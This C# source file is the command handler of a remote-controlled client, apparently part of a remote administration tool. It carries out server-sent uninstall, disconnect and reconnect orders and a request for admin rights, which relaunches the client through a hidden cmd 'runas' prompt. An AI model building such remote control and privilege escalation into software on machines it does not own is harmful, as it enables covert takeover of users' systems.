using Fahad.Client.Config;
using Fahad.Client.Networking;
using Fahad.Client.Setup;
using Fahad.Client.User;
using Fahad.Client.Utilities;
using Fahad.Common.Enums;
using Fahad.Common.Messages;
using Fahad.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Fahad.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly FahadClient _client;

        private readonly FahadApplication _application;

        public ClientServicesHandler(FahadApplication application, FahadClient client)
        {
            _application = application;
            _client = client;
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
            try
            {
                new ClientUninstaller().Uninstall();
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new UserAccount();
            if (userAccount.Type != AccountType.Admin)
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "Process already elevated." });
            }
        }
    }
}
